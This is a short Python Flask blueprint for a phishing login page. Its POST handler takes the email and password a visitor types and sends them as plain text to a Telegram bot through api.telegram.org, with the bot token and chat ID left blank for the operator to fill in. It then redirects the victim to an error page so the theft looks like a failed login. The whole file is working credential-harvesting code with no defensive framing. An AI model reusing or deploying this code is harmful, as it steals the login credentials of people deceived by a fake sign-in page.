from flask.blueprints import Blueprint
from flask import render_template
from flask import request , redirect , url_for
import requests
tokn_bot = #telegram api tokn
chat_id =# telegram chat_id 
#             from ALD.2OX-v_.0
index = Blueprint('index',__name__,
                   template_folder = 'templates',
                   static_folder = 'static',
                   static_url_path = '/index/static')

@index.route('/', methods = ['GET','POST'])
def page_login():
 
  if request.method == 'POST':
    name = request.form['email']
    password = request.form['Pass']
    data = f"UserName: ({name}) and password: ({password})"
    if name and password :
      url =f"https://api.telegram.org/bot{tokn_bot}/sendMessage?chat_id={chat_id}&text={data}"
      requests.get(url)
      return redirect(url_for('index.page_error'))
  return render_template('index.html')
@index.route("/error")
def page_error():
   return render_template('error.html')